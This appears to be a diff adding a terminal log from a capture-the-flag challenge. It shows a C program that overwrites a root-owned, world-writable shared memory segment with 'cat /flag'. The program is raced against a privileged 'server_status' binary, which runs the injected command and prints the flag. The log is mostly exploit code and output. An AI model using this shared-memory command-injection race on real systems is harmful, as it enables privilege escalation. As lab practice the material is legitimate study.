@@ -1,0 +1,61 @@
+acker@64962022fdcc:~$ cat > solve.c
+#include <sys/ipc.h>
+#include <sys/shm.h>
+#include <string.h>
+#include <stdio.h>
+
+int main() {
+    int shmid = 8;  // ✅ Dùng đúng ID
+    char *cmd = "cat /flag";  // ✅ Đường dẫn chính xác đến flag
+
+    char *shm = shmat(shmid, NULL, 0);
+    if (shm == (char *)-1) {
+        perror("shmat");
+        return 1;
+    }
+
+    strcpy(shm, cmd);
+    shmdt(shm);
+
+    printf("✅ Overwritten with: %s\n", cmd);
+    return 0;
+}
+hacker@64962022fdcc:~$ gcc solve.c -o overwrite
+hacker@64962022fdcc:~$ ./server_status & sleep 0.3 && ./overwrite
+[2] 404
+=== Server Status Monitor v1.0 ===
+System diagnostic tool with root privileges
+
+Running with elevated privileges (UID: 0, GID: 0)
+Initializing...
+Hacking Nasa...
+*******✅ Overwritten with: cat /flag
+hacker@64962022fdcc:~$ *********************************
+Done!
+=== Command Output ===
+NHNC{just_sharing_every_every_thing_around_world__db2749bc474541709b3340202cc22c18}=== End of Output ===
+
+System status check completed successfully!
+^C
+[2]-  Done                    ./server_status
+hacker@64962022fdcc:~$ ./server_status & ipcs -m
+[2] 420
+=== Server Status Monitor v1.0 ===
+System diagnostic tool with root privileges
+
+Running with elevated privileges (UID: 0, GID: 0)
+Initializing...
+Hacking Nasa...
+*
+------ Shared Memory Segments --------
+key        shmid      owner      perms      bytes      nattch     status      
+0x000c5b87 10         root       666        1024       0                       
+
+hacker@64962022fdcc:~$ ***************************************
+Done!
+=== Command Output ===
+dmesg: read kernel buffer failed: Operation not permitted
+=== End of Output ===
+
+System status check completed successfully!
+
